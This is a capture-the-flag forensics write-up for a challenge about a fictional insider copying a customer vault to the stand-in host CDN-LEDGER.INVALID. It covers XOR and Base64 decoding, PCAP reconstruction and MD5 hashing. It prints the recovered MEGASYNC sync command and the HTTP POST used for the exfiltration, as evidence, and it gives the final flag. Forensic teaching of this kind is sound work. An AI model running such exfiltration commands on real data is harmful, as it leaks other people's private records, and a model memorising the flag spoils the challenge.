---
title: "Operation Dark Crush"
ctf: "GoPWNIt"
date: 2026-10-10
category: forensics
difficulty: hard
points: 150
flag_format: "GPI{md5_hex_digest}"
author: "nomadrai"
---

# Operation Dark Crush

## Summary

Correlate the seized workstation, memory, USB, mobile, cloud, and network
artifacts to identify an insider-assisted customer-vault exfiltration. Decode
XOR-obfuscated evidence, reconstruct the incident string, and hash it with MD5.

## Solution

### 1. Correlate the account and transfer

All 24 SHA-256 manifest entries verify. The employee list identifies account
`cferguson` as **Christine Ferguson**. The Windows process event at
`2026-09-28T07:52:32` contains a Base64/UTF-16LE PowerShell command invoking
`MEGASYNC.exe sync C:\Vault\ CDN-LEDGER.INVALID:/leak`.

Cloud and storage-access logs independently record the same user's vault
transfer at the same time, with **316669952 bytes**, exactly **302 × 1048576**.
The challenge's accepted size field is `302MB`. Amcache, Prefetch, the USN
journal, and the recent-document shortcut corroborate the tool and timestamp.

### 2. Recover the case ID and threat actor

Memory contains three decoding clues:

| Artifact | Decode operation |
|---|---|
| USB image | XOR every byte with `0x7A`, yielding a TAR archive |
| `.vault_sync/exfil_plan.enc` in the TAR | XOR with `0x33`, then Base64-decode |
| Suspicious TCP payload | XOR with `0x42` |

The USB plan decodes to:

```text
Exfiltration target: Push customer vault using MEGASYNC to CDN-LEDGER.INVALID. Incident tracking assigned as CASE-3714. Threat coordinator: EXFILKING.
```

The attachment named `.pcapng` actually contains classic little-endian PCAP.
Its synthetic exfiltration packets all use sequence zero, so reconstruct their
payload in capture order. After XOR decoding, the HTTP request contains:

```http
POST /api/v1/vault-sync HTTP/1.1
Host: CDN-LEDGER.INVALID
X-Session-Auth: Q0FTRS0zNzE0
X-Client-ID: TUVHQVNZTkMvMS40LjI=
Content-Length: 316669952
```

The Base64 header values decode to `CASE-3714` and `MEGASYNC/1.4.2`, confirming
the USB plan and tool. Mobile messages and the leak-site mirror corroborate
`EXFILKING` and the destination. The captured body is only 7,000,000 bytes;
use the full transfer size independently reported by the request and cloud logs.

### 3. Hash the accepted incident string

| Field | Accepted value |
|---|---|
| Insider | `CHRISTINE_FERGUSON` |
| Threat actor | `EXFILKING` |
| Tool | `MEGASYNC` |
| Domain | `CDN-LEDGER.INVALID` |
| Date | `2026-09-28` |
| Time | `07-52-32` |
| Size | `302MB` |
| Case ID | `CASE-3714` |

Join every field with underscores after the `DARK_LEDGER` prefix. Hash the
following ASCII string **without a trailing newline**:

```text
DARK_LEDGER_CHRISTINE_FERGUSON_EXFILKING_MEGASYNC_CDN-LEDGER.INVALID_2026-09-28_07-52-32_302MB_CASE-3714
```

The evidence is byte-for-byte identical to CRUSH WORKSTATION UPDATE, but this
challenge expects **MEGASYNC without `.EXE`**. The platform acceptance confirms
this serialization.

The complete solving entry point is [solve.py](solve.py), which calls the
standard-library evidence recovery and cross-checking code in [analyze.py](analyze.py):

```bash
python "Operation Dark Crush/solve.py"
```

## Flag

```text
GPI{6134b1d0179fc89c2e8ec8105fa29a0e}
```

**Submitted and accepted: 150 points, #32 Solve.** The challenge also appears
in the account's solved list. Acceptance is recorded in
[submission_result.json](submission_result.json).
